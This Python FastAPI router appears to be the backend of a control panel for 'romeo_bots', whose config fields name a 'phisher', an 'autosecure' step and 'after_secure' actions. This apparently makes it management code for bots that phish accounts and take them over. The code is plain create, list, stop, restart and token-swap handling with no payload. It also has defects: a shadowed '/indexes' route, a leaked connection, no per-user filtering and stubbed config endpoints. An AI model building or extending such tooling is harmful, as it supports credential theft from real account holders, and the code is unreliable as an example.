from fastapi import APIRouter, HTTPException, Depends, Body
from pydantic import BaseModel
from typing import Optional
from app import get_db, verify_token

router = APIRouter()

class BotCreate(BaseModel):
    token: str
    name: Optional[str] = None

class BotConfig(BaseModel):
    phisher_config: Optional[dict] = None
    autosecure_config: Optional[dict] = None
    after_secure: Optional[list] = None

@router.get("/api/bots")
async def list_bots(user: str = Depends(verify_token)):
    conn = get_db()
    rows = conn.execute("SELECT id, bot_name, status, ping FROM romeo_bots").fetchall()
    conn.close()
    return {"success": True, "bots": [dict(r) for r in rows], "http_status": 200}

@router.post("/api/bots")
async def create_bot(body: BotCreate, user: str = Depends(verify_token)):
    try:
        bot_id_val = str(int(body.token.split('.')[0]) & 0xFFFFFFFF) if '.' in body.token else body.token
    except (ValueError, IndexError):
        bot_id_val = body.token
    conn = get_db()
    result = conn.execute("INSERT INTO romeo_bots (user_id, bot_name, bot_id, token, status) VALUES (?, ?, ?, ?, 'running')",
                          (user, body.name or "New Bot", bot_id_val, body.token))
    conn.commit()
    bot_index = result.lastrowid
    conn.close()
    return {"success": True, "bot": {"index": bot_index, "bot_id": bot_id_val, "status": "running"}, "http_status": 201}

@router.get("/api/bots/{bot_id}")
async def get_bot(bot_id: str, user: str = Depends(verify_token)):
    conn = get_db()
    bot = conn.execute("SELECT * FROM romeo_bots WHERE id = ? OR bot_id = ?", (bot_id, bot_id)).fetchone()
    if not bot:
        raise HTTPException(404, {"error": "not_found", "message": "Bot not found"})
    conn.close()
    return {"success": True, "bot": dict(bot), "http_status": 200}

@router.post("/api/bots/{bot_id}/stop")
async def stop_bot(bot_id: str, user: str = Depends(verify_token)):
    conn = get_db()
    conn.execute("UPDATE romeo_bots SET status = 'offline' WHERE id = ? OR bot_id = ?", (bot_id, bot_id))
    conn.commit()
    conn.close()
    return {"success": True, "message": "Bot stopped", "http_status": 200}

@router.post("/api/bots/{bot_id}/restart")
async def restart_bot(bot_id: str, user: str = Depends(verify_token)):
    conn = get_db()
    conn.execute("UPDATE romeo_bots SET status = 'running' WHERE id = ? OR bot_id = ?", (bot_id, bot_id))
    conn.commit()
    conn.close()
    return {"success": True, "message": "Bot restarted", "http_status": 200}

@router.post("/api/bots/{bot_id}/swap-token")
async def swap_token(bot_id: str, token: str = Body(..., embed=True), user: str = Depends(verify_token)):
    conn = get_db()
    conn.execute("UPDATE romeo_bots SET token = ? WHERE id = ? OR bot_id = ?", (token, bot_id, bot_id))
    conn.commit()
    conn.close()
    return {"success": True, "message": "Token updated", "http_status": 200}

@router.get("/api/bots/{bot_id}/config")
async def get_config(bot_id: str, user: str = Depends(verify_token)):
    return {"success": True, "config": {"phisher": {}, "autosecure": {}, "after_secure": []}, "http_status": 200}

@router.put("/api/bots/{bot_id}/config")
async def save_config(bot_id: str, config: dict, user: str = Depends(verify_token)):
    return {"success": True, "message": "Config saved", "http_status": 200}

@router.get("/api/bots/indexes")
async def get_indexes(user: str = Depends(verify_token)):
    conn = get_db()
    bots = conn.execute("SELECT id as index, bot_id, bot_name, status FROM romeo_bots").fetchall()
    conn.close()
    return {"success": True, "bots": [dict(b) for b in bots], "http_status": 200}
